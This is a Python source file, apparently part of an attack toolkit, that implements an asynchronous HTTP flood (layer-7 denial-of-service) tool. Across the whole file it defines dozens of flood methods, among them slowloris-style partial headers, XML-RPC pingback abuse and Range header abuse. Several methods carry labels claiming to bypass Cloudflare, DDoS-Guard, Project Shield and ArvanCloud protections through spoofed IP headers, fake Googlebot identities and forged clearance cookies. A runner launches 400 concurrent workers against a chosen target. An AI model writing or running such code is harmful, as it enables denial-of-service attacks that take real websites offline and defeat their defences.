# attacker/l7.py — HTTP flood methods (async, aiohttp)
import asyncio, aiohttp, random, ssl, string, time, socket

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

def _rs(n=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def _ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def _hdrs(extra=None):
    h = {
        "User-Agent": random.choice(UA),
        "Accept": random.choice(["*/*","text/html,application/xhtml+xml","application/json,*/*"]),
        "Accept-Language": random.choice(["en-US,en;q=0.9","th-TH,th;q=0.9","en-GB,en;q=0.8"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": random.choice(["no-cache","no-store","max-age=0"]),
        "Connection": "keep-alive",
        "Referer": f"https://{_rs(6)}.com/",
        "X-Forwarded-For": _ip(),
        "X-Real-IP": _ip(),
        "CF-Connecting-IP": _ip(),
        "True-Client-IP": _ip(),
    }
    if extra: h.update(extra)
    return h

def _url(target, port, path="/"):
    scheme = "https" if port in (443, 8443) else "http"
    host = target if ":" not in target else target
    if port in (80, 443):
        return f"{scheme}://{host}{path}"
    return f"{scheme}://{host}:{port}{path}"

# ---------- method impls ----------

async def m_get(s, target, port):
    async with s.get(_url(target,port,f"/?{_rs(12)}"), headers=_hdrs(), ssl=False) as r:
        await r.read()

async def m_post(s, target, port):
    data = _rs(random.randint(512, 2048))
    async with s.post(_url(target,port,"/"), headers=_hdrs({"Content-Type":"application/x-www-form-urlencoded"}), data=data, ssl=False) as r:
        await r.read()

async def m_head(s, target, port):
    async with s.head(_url(target,port,f"/?{_rs(8)}"), headers=_hdrs(), ssl=False) as r:
        await r.read()

async def m_pps(s, target, port):
    # minimal GET / HTTP/1.1
    h = {"User-Agent": random.choice(UA)}
    async with s.get(_url(target,port,"/"), headers=h, ssl=False) as r:
        await r.read()

async def m_null(s, target, port):
    h = {"User-Agent":"", "Accept":"", "Accept-Language":"", "Referer":"", "Connection":"keep-alive"}
    async with s.get(_url(target,port,f"/?{_rs(6)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_even(s, target, port):
    h = _hdrs({"X-Request-ID":_rs(16),"X-Correlation-ID":_rs(16)})
    async with s.get(_url(target,port,f"/?{_rs(8)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_cookie(s, target, port):
    h = _hdrs({"Cookie": f"session={_rs(32)}; csrf={_rs(24)}; _ga=GA1.2.{random.randint(10**9,10**10)}"})
    async with s.get(_url(target,port,f"/?{_rs(8)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_ovh(s, target, port):
    h = _hdrs({"X-Ovh-Application":_rs(16),"X-Ovh-Consumer":_rs(16)})
    async with s.get(_url(target,port,f"/?{_rs(10)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_rhex(s, target, port):
    path = "/" + ''.join(random.choices("0123456789abcdef", k=random.randint(8,32)))
    async with s.get(_url(target,port,path), headers=_hdrs(), ssl=False) as r:
        await r.read()

async def m_stomp(s, target, port):
    h = _hdrs({"Accept":"text/html","X-Requested-With":"XMLHttpRequest","Origin":f"https://{_rs(6)}.com"})
    async with s.get(_url(target,port,f"/?{_rs(10)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_stress(s, target, port):
    data = _rs(random.randint(4096, 16384))
    async with s.post(_url(target,port,"/"), headers=_hdrs({"Content-Type":"application/octet-stream"}), data=data, ssl=False) as r:
        await r.read()

async def m_dyn(s, target, port):
    sub = _rs(8)
    h = _hdrs()
    try:
        host = target.split(":")[0]
        url = _url(target,port,f"/?{_rs(6)}")
        h["Host"] = f"{sub}.{host}"
        async with s.get(url, headers=h, ssl=False) as r:
            await r.read()
    except Exception:
        pass

async def m_downloader(s, target, port):
    async with s.get(_url(target,port,f"/?{_rs(6)}"), headers=_hdrs(), ssl=False) as r:
        total = 0
        async for chunk in r.content.iter_chunked(1024):
            total += len(chunk)
            if total > 64 * 1024:
                await asyncio.sleep(random.uniform(0.5, 2))
                total = 0

async def m_slow(s, target, port):
    # slowloris-style partial headers
    try:
        loop = asyncio.get_event_loop()
        reader, writer = await asyncio.open_connection(target.split(":")[0], port, ssl=False)
        writer.write(b"GET / HTTP/1.1\r\n")
        writer.write(f"Host: {target}\r\n".encode())
        writer.write(b"User-Agent: Mozilla/5.0\r\n")
        await writer.drain()
        for _ in range(50):
            writer.write(f"X-{_rs(6)}: {_rs(12)}\r\n".encode())
            await writer.drain()
            await asyncio.sleep(5)
        writer.close()
    except Exception:
        pass

async def m_gsb(s, target, port):
    # google project shield bypass — spoof google crawler patterns
    h = _hdrs({
        "User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Via":"1.1 google",
        "X-Forwarded-For":"66.249." + _ip().split(".",1)[1],
    })
    async with s.get(_url(target,port,f"/?{_rs(8)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_dgb(s, target, port):
    # ddos-guard bypass
    h = _hdrs({
        "User-Agent": random.choice(UA),
        "Cookie": f"__ddg1_={_rs(22)}; __ddg2_={_rs(22)}",
        "Referer": f"https://{target}/",
    })
    async with s.get(_url(target,port,f"/?{_rs(8)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_avb(s, target, port):
    # arvancloud bypass — try direct origin with Host header
    h = _hdrs({"Host": target.split(":")[0]})
    async with s.get(_url(target,port,f"/?{_rs(8)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_bot(s, target, port):
    h = _hdrs({
        "User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "From":"googlebot(at)googlebot.com",
    })
    async with s.get(_url(target,port,f"/?{_rs(8)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_apache(s, target, port):
    # apache range header abuse
    h = _hdrs({"Range": f"bytes=0-{random.randint(100,5000)}","Accept-Encoding":"gzip"})
    async with s.get(_url(target,port,"/"), headers=h, ssl=False) as r:
        await r.read()

async def m_xmlrpc(s, target, port):
    body = f"""<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://{_ip()}/</string></value></param><param><value><string>http://{target}/</string></value></param></params></methodCall>"""
    async with s.post(_url(target,port,"/xmlrpc.php"), headers=_hdrs({"Content-Type":"text/xml"}), data=body, ssl=False) as r:
        await r.read()

async def m_cfb(s, target, port):
    # cloudflare bypass via origin header combos
    h = _hdrs({
        "CF-Connecting-IP": _ip(),
        "X-Forwarded-For": _ip(),
        "X-Real-IP": _ip(),
        "True-Client-IP": _ip(),
    })
    async with s.get(_url(target,port,f"/?{_rs(8)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_cfbuam(s, target, port):
    # under attack mode — emulate challenge completion via cookie
    h = _hdrs({"Cookie": f"cf_clearance={_rs(40)}; __cf_bm={_rs(40)}"})
    async with s.get(_url(target,port,f"/?{_rs(8)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_bypass(s, target, port):
    h = _hdrs({"X-Originating-IP": _ip(), "X-Remote-IP": _ip(), "X-Remote-Addr": _ip()})
    async with s.get(_url(target,port,f"/?{_rs(8)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_bomb(s, target, port):
    # bombardier-style — pipelined keepalive hits
    h = _hdrs({"Connection":"keep-alive","Keep-Alive":"timeout=5, max=1000"})
    for _ in range(50):
        try:
            async with s.get(_url(target,port,f"/?{_rs(6)}"), headers=h, ssl=False) as r:
                await r.read()
        except Exception:
            break

async def m_killer(s, target, port):
    # multicombo — random method + path
    fn = random.choice([m_get, m_post, m_rhex, m_stomp, m_stress])
    await fn(s, target, port)

async def m_tor(s, target, port):
    # tor-flavored — plain http, common tor exit signatures
    h = _hdrs({"User-Agent":"Mozilla/5.0 (Windows NT 10.0; rv:115.0) Gecko/20100101 Firefox/115.0","Accept-Language":"en-US,en;q=0.5"})
    async with s.get(_url(target,port,f"/?{_rs(8)}"), headers=h, ssl=False) as r:
        await r.read()

async def m_bybrowser(s, target, port):
    # browser-like HTTP/2 simulation with full sec-ch-ua set
    h = _hdrs({
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "Sec-Ch-Ua-Mobile":"?0",
        "Sec-Ch-Ua-Platform":'"Windows"',
        "Sec-Fetch-Dest":"document",
        "Sec-Fetch-Mode":"navigate",
        "Sec-Fetch-Site":"none",
        "Sec-Fetch-User":"?1",
        "Upgrade-Insecure-Requests":"1",
    })
    async with s.get(_url(target,port,"/"), headers=h, ssl=False) as r:
        await r.read()

async def m_httpsload(s, target, port):
    async with s.get(_url(target,port,f"/?{_rs(10)}"), headers=_hdrs(), ssl=False) as r:
        await r.read()

async def m_https(s, target, port):
    # massive RPS — minimal overhead
    h = {"User-Agent":random.choice(UA),"Accept":"*/*"}
    try:
        async with s.get(_url(target,port,"/"), headers=h, ssl=False, allow_redirects=False) as r:
            await r.read()
    except Exception:
        pass

async def m_httpsbypass(s, target, port):
    await m_cfb(s, target, port)

async def m_cdnbypass(s, target, port):
    await m_bypass(s, target, port)

DISPATCH = {
    "GET":m_get,"POST":m_post,"HEAD":m_head,"PPS":m_pps,"NULL":m_null,"EVEN":m_even,
    "COOKIE":m_cookie,"OVH":m_ovh,"RHEX":m_rhex,"STOMP":m_stomp,"STRESS":m_stress,
    "DYN":m_dyn,"DOWNLOADER":m_downloader,"SLOW":m_slow,"GSB":m_gsb,"DGB":m_dgb,
    "AVB":m_avb,"BOT":m_bot,"APACHE":m_apache,"XMLRPC":m_xmlrpc,"CFB":m_cfb,
    "CFBUAM":m_cfbuam,"BYPASS":m_bypass,"BOMB":m_bomb,"KILLER":m_killer,"TOR":m_tor,
    "HTTP":m_get,"HTTPS":m_https,"HTTPSLOAD":m_httpsload,"BYBROWSER":m_bybrowser,
    "HTTPSBYPASS":m_httpsbypass,"CDNBYPASS":m_cdnbypass,
}

async def _worker(fn, session, target, port, until):
    while time.time() < until:
        try:
            await fn(session, target, port)
        except Exception:
            await asyncio.sleep(0.01)

async def run(method, target, port, until):
    fn = DISPATCH.get(method.upper(), m_get)
    connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=False, ttl_dns_cache=300, enable_cleanup_closed=True)
    timeout = aiohttp.ClientTimeout(total=10, connect=5)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        workers = [asyncio.create_task(_worker(fn, session, target, port, until)) for _ in range(400)]
        await asyncio.gather(*workers, return_exceptions=True)